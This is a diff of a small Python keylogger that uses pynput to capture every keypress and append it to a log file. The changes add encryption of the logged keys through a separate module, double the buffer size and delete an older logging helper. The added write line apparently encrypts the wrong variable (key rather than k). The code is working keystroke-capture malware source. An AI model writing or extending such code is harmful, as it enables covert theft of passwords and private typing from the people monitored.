@@ -1,7 +1,7 @@
 # f = open("log.txt",'a')
 # f.write('\nbaruch lavy')
 # f.close()
-
+from my_encrypt import encrypt , decrypt
 import datetime;
 from pynput.keyboard import Key, Listener
 
@@ -18,7 +18,7 @@ def on_press(key):
     count += 1
     print("{0} pressed", format(key))
 
-    if count >= 10:
+    if count >= 20:
         count = 0
         write_file(keys)
         keys = [] 
@@ -31,7 +31,7 @@ def write_file(keys):
             if k.find("space") > 0:
                 f.write(' ')
             elif k.find("Key") == -1:
-                f.write(k)
+                f.write(encrypt(str(key)))
         f.write('\n')
 
 def on_release(key):
@@ -40,23 +40,3 @@ def on_release(key):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
-
-
-
-def writeToFile(key):
-    letter = str(key)
-    letter = letter.replace("'","")
-
-    if letter == 'Key.space':
-        letter = ' '
-    elif letter == 'Key.shift_r':
-        letter = ''
-    elif letter == 'Key.backspace':
-        letter = ''
-    elif letter == 'Key.enter':
-        letter = '\n'
-    elif letter == 'Key.esc':
-        return False
-    with open("log.txt",'a') as f:
-        f.write(letter)
